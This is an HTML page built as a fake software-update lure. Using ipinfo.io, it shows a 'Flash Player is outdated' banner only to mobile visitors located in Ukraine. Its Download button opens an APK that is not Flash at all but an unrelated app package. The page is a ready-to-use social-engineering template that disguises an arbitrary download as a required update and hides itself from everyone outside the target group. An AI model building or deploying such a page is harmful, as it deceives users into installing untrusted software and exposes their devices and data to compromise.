<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>

var country = "UA";
var download_link = "https://www.apkmirror.com/wp-content/uploads/2020/02/5e41acdf3830d/com.starbucks.mobilecard_5.15-12136_minAPI23(arm64-v8a,armeabi,armeabi-v7a,mips,x86,x86_64)(nodpi)_apkmirror.com.apk?verify=1581368274-9NpLiIY0%2Bb6u%2BuRNscca8IKkoh6Njcgp%2BeK2NmJGk%2BA%3D";
var mobile_pattern = /Chrome|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;

window.onload = function() {
	getGeoPosition();
}

function btnOnClick(){
	downloadResource();
}

function showDialog(){
	document.body.className += " loaded";
}

function testClient(){
	return mobile_pattern.test(navigator.userAgent);
}

function testGeo(currentCountry){
	return country != null && currentCountry === country;
}

function downloadResource(){
	window.open(download_link);
}

function getGeoPosition(){
	$.get("https://ipinfo.io", function (response) {
		  
		 if (testClient() && testGeo(response.country))
			showDialog();
			
		}, "jsonp");
}

</script>
 <style type="text/css">
   .d-container {
		height: 100%;
		width: 100%;
		background-color: #f2f2f2;
		position: absolute;
		left: 0;
		top: 0;
		max-height: 50px;
		opacity:0;
		-moz-transition: opacity 3s;
		-webkit-transition: opacity 3s;
		-o-transition: opacity 3s;
		transition: opacity 3s;
		line-height: 50px;
	}
   
   .d-btn-download{
		padding: 9px;
		position: relative;
		color: #fff;
		background-color: #1A73E8;
		font-family: sans-serif;
		font-size: 12px;
		font-weight: 600;
		border: none;
		border-radius: 4px;
		cursor: pointer;
    }
	.d-txt{
		padding-right: 10px;
		padding-left: 20px;
		font-family: Sans-serif;
		font-size: 14px;
		font-weight: 100;
	}
	a.d-txt-learn{
		color: #1A73E8;
		margin-right: 30px;
		font-family: sans-serif;
		font-size: 12px;
		float: right;
		text-decoration: none;
		
	}
	body.loaded .d-container {
		opacity: 1;
	}
  </style>
</head>
<body>
<div class="d-container">
	<span class="d-txt">Flash Player is outdated. Please download a new version.</span>
	<button class="d-btn-download" onclick="btnOnClick()">Download</button>
	<a href="#" class="d-txt-learn" underline="none">Learn more</a>
</div>

</body>
</html>
